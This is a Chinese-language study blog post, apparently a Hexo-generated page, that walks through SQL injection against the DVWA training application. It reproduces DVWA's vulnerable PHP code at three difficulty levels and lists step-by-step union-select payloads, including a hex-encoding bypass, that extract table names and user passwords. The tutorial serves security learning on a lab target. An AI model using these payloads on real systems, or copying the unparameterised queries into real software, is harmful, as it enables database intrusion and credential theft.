@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content>
+  <meta name="author" content="ST0new">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="DVWA 之SQL Injection">
+  <meta property="og:description" content="一个ctfer，web渗透测试小白">
+  <meta property="og:site_name" content="ST0new的小站">
+  <meta property="og:type" content="article">
+  <meta property="og:image" content="http://yoursite.com">
+  
+    <link rel="alternate" href="/atom.xml" title="ST0new的小站" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>ST0new的小站</title>
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.min.css">
+  <!-- Custom CSS -->
+  
+  <link rel="stylesheet" href="/css/style.light.css">
+
+  <!-- Google Analytics -->
+  
+
+</head>
+
+  <body>
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/img/default-banner-light.jpg)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">DVWA 之SQL Injection</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://github.com/ST0new/">
+                  
+                  Github
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="mailto:<your-email-address>">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By ST0new</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2019-10-04</span>
+            <span class="time">11:14:57</span>
+          </span>
+          
+          <!--  Categories  -->
+            <span class="categories info">Under 
+
+<a href="/categories/Web安全/">Web安全</a>
+</span>
+          
+        </div>
+        <!-- Tags -->
+        
+          <div class="post-tags text-muted">
+            Tags: 
+
+<a class="tag" href="/tags/DVWA/">#DVWA</a>
+
+
+          </div>
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <p>SQL注入就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令</p>
+<a id="more"></a>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文属于学习贴，我自己在学习的时候总结的，如有错误，请大家及时指出</p>
+<blockquote>
+<p>dvwa v1.0.7</p>
+</blockquote>
+<h2 id="何为SQL-injection"><a href="#何为SQL-injection" class="headerlink" title="何为SQL injection"></a>何为SQL injection</h2><p><a href="https://baike.baidu.com/item/sql%E6%B3%A8%E5%85%A5/150289?fr=aladdin" target="_blank" rel="noopener">SQL injection</a> 即SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p>
+<h2 id="手工注入思路"><a href="#手工注入思路" class="headerlink" title="手工注入思路"></a>手工注入思路</h2><p>虽然sqlmap好用，但还是要掌握一些手工注入的思路。下面我们了解一下非盲注的步骤</p>
+<blockquote>
+<p>步骤来自FreeBuf.COM的lonehand</p>
+</blockquote>
+<ol>
+<li>判断是否存在注入，判断注入的类型是字符型还是数字型（因为判断注入主要是用这两种来判断的）</li>
+<li>猜解SQL查询语句的字段数</li>
+<li>确定显示的字段顺序</li>
+<li>获取数据库</li>
+<li>获取数据库的表</li>
+<li>获取表中的字段名</li>
+<li>拿到想要的数据</li>
+</ol>
+<h1 id="DVWA-sql注入进行学习"><a href="#DVWA-sql注入进行学习" class="headerlink" title="DVWA sql注入进行学习"></a>DVWA sql注入进行学习</h1><h2 id="Low-级别"><a href="#Low-级别" class="headerlink" title="Low 级别"></a>Low 级别</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'Submit'</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获取输入</span></span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">	   <span class="comment">//执行sql命令</span></span><br><span class="line">    $getid = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id'"</span>;</span><br><span class="line">    $result = mysql_query($getid) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">	   <span class="comment">//返回结果</span></span><br><span class="line">    $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($i &lt; $num) &#123;			<span class="comment">//结果存在</span></span><br><span class="line">		<span class="comment">//将得到的结果保存在变量中</span></span><br><span class="line">        $first = mysql_result($result,$i,<span class="string">"first_name"</span>);</span><br><span class="line">        $last = mysql_result($result,$i,<span class="string">"last_name"</span>);</span><br><span class="line">        <span class="comment">//输出到界面</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'ID: '</span> . $id . <span class="string">'&lt;br&gt;First name: '</span> . $first . <span class="string">'&lt;br&gt;Surname: '</span> . $last;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p><a href="http://www.w3school.com.cn/php/func_mysql_query.asp" target="_blank" rel="noopener">mysql_query()</a> 函数执行一条 MySQL 查询。<br><a href="http://www.w3school.com.cn/php/func_mysql_num_rows.asp" target="_blank" rel="noopener">mysql_num_rows()</a> 函数返回结果集中行的数目。<br><a href="http://www.w3school.com.cn/php/func_mysql_result.asp" target="_blank" rel="noopener">mysql_result()</a> 函数返回结果集中一个字段的值。  </p>
+<blockquote>
+<p>可以发现，没有任何的过滤和检查，可以直接构造sql 注入的命令。</p>
+</blockquote>
+<h2 id="Low-漏洞利用"><a href="#Low-漏洞利用" class="headerlink" title="Low 漏洞利用"></a>Low 漏洞利用</h2><ol>
+<li>判断是否存在注入，判断注入的类型是字符型还是数字型<br>先输入一些内容查看结果<br><img src="https://img-blog.csdnimg.cn/20190502225219381.png" alt="在这里插入图片描述"><br>测试是否存在注入<br>输入命令<code>1 and 1=1</code>,返回了正确的值。<br><img src="https://img-blog.csdnimg.cn/20190502225332605.png" alt="在这里插入图片描述"><br>输入命令 <code>1 and 1=2</code>,返回了正确的值。后台数据库没有处理我们输入的值，可能不存在数字型注入<br><img src="https://img-blog.csdnimg.cn/20190502225422926.png" alt="在这里插入图片描述"><br>输入命令<code>1&#39;and &#39;1&#39; = &#39;2</code> 没有返回值，可能存在注入。<br><img src="https://img-blog.csdnimg.cn/20190502225441636.png" alt="在这里插入图片描述"><br>输入命令<code>1’ or ‘1’ =’1</code> 查询成功。 不正常的结果返回，存在字符型注入<br><img src="https://img-blog.csdnimg.cn/20190502225511808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
+<li>猜解SQL查询语句的字段数<br>使用order by 数字 从1依次递增去执行，发现命令错误时，则可以推出字段值<br>我们知道<code>1&#39; or 1=1</code> 执行时会报错的，而我们需要在字段超出的时候在报错，所以先构造一个会报错的命令：例如 <code>1&#39; and 1=1</code>，这是一个会报错的命令.<br><img src="https://img-blog.csdnimg.cn/20190502225625703.png" alt="在这里插入图片描述"><br>我们添加order by 到命令后,并注释,确保正确执行。<br><code>1&#39; and 1=1 order by 1 #</code><br><img src="https://img-blog.csdnimg.cn/20190502225659845.png" alt="在这里插入图片描述"><br>输入<code>1&#39; and 1=1 order by 2 #</code><br><img src="https://img-blog.csdnimg.cn/20190502225804750.png" alt="在这里插入图片描述"><br>输入<code>1&#39; and 1=1 order by 3 #``  
+说明执行的sql查询语句只有两个字段，  
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502225822295.png)  
+也可以使用union select 来查询字段，这样也可以获取字段
+输入</code>1’ and 1=1 union select 1,2 #<code>![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502230020712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)
+输入</code>1’ and 1=1 union select 1,2,3 #`<br><img src="https://img-blog.csdnimg.cn/20190502230132800.png" alt="在这里插入图片描述">  </li>
+<li>确定显示的字段顺序<br>如果使用order by 来获取的字段值，我们需要使用 <code>union select 1,2 #</code> 来获取字段的顺序，使用<code>union select</code> 就不需要这一步。<br>输入命令： <code>1’ union select 1,2 #</code><br><img src="https://img-blog.csdnimg.cn/20190502230756923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
+<li>获取数据库<br>输入命令：<code>1’ union select 1,database() #</code><br><img src="https://img-blog.csdnimg.cn/20190502230846528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>获取到数据库：<code>dvwa</code></li>
+<li>获取数据库中的表<br>输入命令：<code>1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code><br><img src="https://img-blog.csdnimg.cn/20190502230940249.png" alt="在这里插入图片描述"><br>数据库中dvwa 有两个表，guestbook和users</li>
+<li>获取表中的字段名<br>输入命令：<code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name = &#39;users&#39; #</code><br><img src="https://img-blog.csdnimg.cn/20190502231031420.png" alt="在这里插入图片描述"><br>users有5个段,<code>user_id,first_name,last_name,user,password,avatar</code></li>
+<li>拿到想要的数据<br>输入命令：<code>1’ union select group_concat(user_id,first_name,last_name),group_concat(passwrod) from users #</code><br><img src="https://img-blog.csdnimg.cn/2019050223112869.png" alt="在这里插入图片描述"><br>这样就可以得到users表中的用户<code>user_id,first_name,last_name,password</code></li>
+</ol>
+<h2 id="Medium-级别"><a href="#Medium-级别" class="headerlink" title="Medium 级别"></a>Medium 级别</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'Submit'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Retrieve data</span></span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    $getid = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id"</span>;</span><br><span class="line"></span><br><span class="line">    $result = mysql_query($getid) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">    $i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first = mysql_result($result,$i,<span class="string">"first_name"</span>);</span><br><span class="line">        $last = mysql_result($result,$i,<span class="string">"last_name"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'ID: '</span> . $id . <span class="string">'&lt;br&gt;First name: '</span> . $first . <span class="string">'&lt;br&gt;Surname: '</span> . $last;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>过滤函数</strong>：<br><a href="http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp" target="_blank" rel="noopener">mysql_real_escape_string()</a> 函数转义 SQL 语句中使用的字符串中的特殊字符。\x00 、\n、 \r、&#39;、、”、\x1a，如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。<br><strong>相关函数</strong>：<br><a href="http://www.w3school.com.cn/php/func_mysql_num_rows.asp" target="_blank" rel="noopener">mysql_num_rows()</a> 函数返回结果集中行的数目。<br><a href="http://www.w3school.com.cn/php/func_mysql_query.asp" target="_blank" rel="noopener">mysql_query()</a> 函数执行一条 MySQL 查询。<br><a href="http://www.w3school.com.cn/php/func_mysql_result.asp" target="_blank" rel="noopener">mysql_result()</a> 函数返回结果集中一个字段的值。  </p>
+</blockquote>
+<h2 id="Medium-漏洞利用"><a href="#Medium-漏洞利用" class="headerlink" title="Medium 漏洞利用"></a>Medium 漏洞利用</h2><p>听说在有版本在前端成为下拉框，这里抓包修改包，绕过就好</p>
+<ol>
+<li><p>判断是否存在注入，判断注入的类型是字符型还是数字型（因为判断注入主要是用这两种来判断的）<br>输入命令：<code>1’ or ‘1’ =’1 #</code> 不是字符型注入，报错<br><img src="https://img-blog.csdnimg.cn/20190502231653246.png" alt="在这里插入图片描述"><br>输入命令：<code>1 or 1=1 #</code><br><img src="https://img-blog.csdnimg.cn/20190502231912434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>存在数字型注入，（刚刚的过滤函数过滤了常见的字符，但是由于是数字型注入，就没有作用了，这里不会使用到引号）  </p>
+</li>
+<li><p>猜解SQL查询语句的字段数<br>接下来就和low级别区别不大了，我们跳过基础讲解<br>输入命令：<code>1 or 1=1 order by 2 #</code><br><img src="https://img-blog.csdnimg.cn/20190502232024370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入命令：<code>输入 1 or 1=1 order by 3 #</code><br><img src="https://img-blog.csdnimg.cn/20190502232110632.png" alt="在这里插入图片描述">  </p>
+</li>
+<li><p>确定显示的字段顺序<br>输入命令：<code>1 union select 1,2 #</code><br><img src="https://img-blog.csdnimg.cn/2019050223215556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+</li>
+<li><p>获取数据库<br>输入命令：<code>1 union select 1,database() #</code><br><img src="https://img-blog.csdnimg.cn/20190502232304932.png" alt="在这里插入图片描述"><br>数据库是dvwa</p>
+</li>
+<li><p>获取数据库的表<br>输入命令：<code>1 union select 1,group_concat(table_name) form information_schema.tables where table_schema = database() #</code><br><img src="https://img-blog.csdnimg.cn/20190502232356592.png" alt="在这里插入图片描述"><br>table 有 <code>guestbook</code> 和 <code>users</code></p>
+</li>
+<li><p>获取表中的字段名<br>输入命令：<code>1 union select 1,group_concat(column_name) from information_schema.columns where table_name = ‘users’ #</code><br>查询失败，引号被转义了<br><img src="https://img-blog.csdnimg.cn/20190502232540616.png" alt="在这里插入图片描述"><br>这里我们采用十六进制进行绕过,users 改为 0×7573657273 成功绕过<br><img src="https://img-blog.csdnimg.cn/20190502232612759.png" alt="在这里插入图片描述"><br>users表中有：user_id,first_name,last_name,password,avatar</p>
+</li>
+<li><p>拿到想要的数据<br>输入命令：<code>1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users</code><br><img src="https://img-blog.csdnimg.cn/20190502232648220.png" alt="在这里插入图片描述"><br>获取到users表中的所有用户的信息</p>
+</li>
+</ol>
+<h2 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'Submit'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Retrieve data</span></span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    $id = stripslashes($id);</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_numeric($id))&#123;</span><br><span class="line"></span><br><span class="line">        $getid = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id'"</span>;</span><br><span class="line">        $result = mysql_query($getid) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">        $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">        $i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">            $first = mysql_result($result,$i,<span class="string">"first_name"</span>);</span><br><span class="line">            $last = mysql_result($result,$i,<span class="string">"last_name"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'ID: '</span> . $id . <span class="string">'&lt;br&gt;First name: '</span> . $first . <span class="string">'&lt;br&gt;Surname: '</span> . $last;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line"></span><br><span class="line">            $i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>过滤函数：</strong><br><a href="http://www.w3school.com.cn/php/func_string_stripslashes.asp" target="_blank" rel="noopener">stripslashes()</a> 函数删除由 addslashes() 函数添加的反斜杠。<br><a href="http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp" target="_blank" rel="noopener">mysql_real_escape_string()</a> 函数转义 SQL 语句中使用的字符串中的特殊字符。<br><a href="https://www.w3cschool.cn/php/php-is_numeric.html" target="_blank" rel="noopener">is_numeric()</a>— 检测变量是否为数字或数字字符串<br><strong>相关函数</strong><br><a href="http://www.w3school.com.cn/php/func_mysql_num_rows.asp" target="_blank" rel="noopener">mysql_num_rows()</a> 函数返回结果集中行的数目。<br><a href="http://www.w3school.com.cn/php/func_mysql_query.asp" target="_blank" rel="noopener">mysql_query()</a> 函数执行一条 MySQL 查询。<br><a href="http://www.w3school.com.cn/php/func_mysql_result.asp" target="_blank" rel="noopener">mysql_result()</a> 函数返回结果集中一个字段的值。</p>
+</blockquote>
+<blockquote>
+<p>大概讲一下，这个代码，判断了输入的id是否是数字类型，stripslasher()删除了addslashes()的函数添加的反斜杠，这样我就不会绕过了。查证之后，发现high级别开启了php的magic_quotes_gpc，所以这里只是告诉了我们怎么防止sql注入，能不能绕过，就看大佬们愿不愿意贡献自己的秘籍了。</p>
+</blockquote>
+<h2 id="解释疑点"><a href="#解释疑点" class="headerlink" title="解释疑点"></a>解释疑点</h2><p>为什么要加#</p>
+<blockquote>
+<p>#的作用是闭合引号，注释字符,比如我们输入命令<code>1’ union select 1,2 #</code>  这里1’会报错，是由于check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’’ at line 1，为了解决报错，我们需要加一个# 注释掉后面多余的引号。</p>
+</blockquote>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.freebuf.com/articles/web/120747.html" target="_blank" rel="noopener">新手指南：DVWA-1.9全级别教程之SQL Injection</a>  </p>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        <p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+<script src="/js/highlight.pack.js"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
